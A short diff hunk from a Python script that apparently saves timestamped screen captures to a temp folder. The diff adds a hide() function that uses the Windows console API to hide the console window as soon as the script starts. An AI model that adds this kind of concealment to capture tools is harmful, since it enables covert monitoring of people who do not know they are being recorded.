@@ -17,6 +17,15 @@ save = tempfile.mkdtemp("screen")
 cwd = os.getcwd() #it returns current working directory
 source = os.listdir() #gives list of files in current directory
 
+#this hide function help to minimize the console
+def hide():
+    import win32console,win32gui
+    window = win32console.GetConsoleWindow()
+    win32gui.ShowWindow(window,0)
+    return True
+
+hide()
+
 #first we use datetime module to get current system-date and time base on that we save the file name
 dateAndtime = datetime.datetime.now().strftime("-%Y-%m-%d-%H-%M-%S")
 #now save filename with the datetime and also mention the temp folder path
